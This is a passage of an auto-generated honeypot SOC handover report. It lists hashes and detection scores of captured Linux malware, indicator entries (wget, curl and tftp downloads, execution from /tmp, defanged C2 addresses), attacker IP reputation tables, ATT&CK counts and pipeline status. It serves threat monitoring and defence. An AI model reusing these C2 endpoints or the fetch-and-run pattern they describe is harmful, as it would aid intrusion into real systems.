| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `186.239.41[.]74` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `83.239.108[.]218` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `195.96.139[.]126` | GB | Driftnet Ltd | **100** ⚠️ | 5 |
| `213.230.64[.]246` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `93.4.16[.]74` | FR | DSL | **100** ⚠️ | 11 |
| `121.202.138[.]181` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `185.242.3[.]195` | DE | Felcloud | **100** ⚠️ | 50 |
| `101.47.15[.]119` | SG | BYTEPLUS | **100** ⚠️ | 39 |
| `217.52.226[.]144` | EG | Nile Online | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 82 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 17 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 17 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 17 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 132 cases |
| Tool 34  | Credential Extractor        | ✅ 109 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (17.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 48 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 31 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 82 priority case(s) shown individually · 17 recon entry/entries in table (5 group(s) consolidating 15 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-17T19:16:53Z_
